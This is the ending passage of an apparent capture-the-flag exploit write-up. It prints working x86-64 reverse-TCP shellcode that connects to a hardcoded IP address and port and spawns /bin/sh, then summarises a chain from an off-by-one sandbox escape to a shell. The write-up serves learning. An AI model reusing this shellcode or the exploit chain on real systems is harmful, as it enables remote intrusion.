<span class="Constant"># Port 17476, chosen so I don</span><span class="Special">'</span>t have to think about endianness at 7am at night :)
<span class="Type">REVERSE_PORT</span> = <span class="Special">&quot;</span><span class="Special">\x44\x44</span><span class="Special">&quot;</span>

<span class="Comment"># 206.220.196.59</span>
<span class="Type">REVERSE_ADDR</span> = <span class="Special">&quot;</span><span class="Special">\xCE\xDC\xC4\x3B</span><span class="Special">&quot;</span>

<span class="Comment"># Simple reverse-tcp shellcode I always use</span>
<span class="Type">SHELLCODE</span> = <span class="Special">&quot;</span><span class="Special">\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a</span><span class="Special">&quot;</span> +
<span class="Special">&quot;</span><span class="Special">\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0</span><span class="Special">&quot;</span> +
<span class="Special">&quot;</span><span class="Special">\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24</span><span class="Special">&quot;</span> +
<span class="Special">&quot;</span><span class="Special">\x02</span><span class="Special">&quot;</span> + <span class="Type">REVERSE_PORT</span> + <span class="Special">&quot;</span><span class="Special">\xc7\x44\x24\x04</span><span class="Special">&quot;</span> + <span class="Type">REVERSE_ADDR</span> + <span class="Special">&quot;</span><span class="Special">\x48\x89\xe6\x6a\x10</span><span class="Special">&quot;</span> +
<span class="Special">&quot;</span><span class="Special">\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48</span><span class="Special">&quot;</span> +
<span class="Special">&quot;</span><span class="Special">\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a</span><span class="Special">&quot;</span> +
<span class="Special">&quot;</span><span class="Special">\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54</span><span class="Special">&quot;</span> +
<span class="Special">&quot;</span><span class="Special">\x5f\x6a\x3b\x58\x0f\x05</span><span class="Special">&quot;</span>

</pre>

It's slightly modified from some code I found online. I'm mostly just including it so I can find it again next time I need it. :)

<h2>Conclusion</h2>

To summarize everything...

There was an off-by-one vulnerability in the verifyBytecode() function. I used that to break out of the sandbox and run unverified bytecode.

That bytecode allowed me to read/write/execute arbitrary memory. I used it to leak the base address of the binary, the base address of the register array (where my reads/writes are relative to), and the address of some +RWX memory.

I copied loader code into that +RWX memory, then ran it. It copied the next bytecode function, as actual machine code, to the +RWX memory.

Then I got a shell.

Hope that was useful!
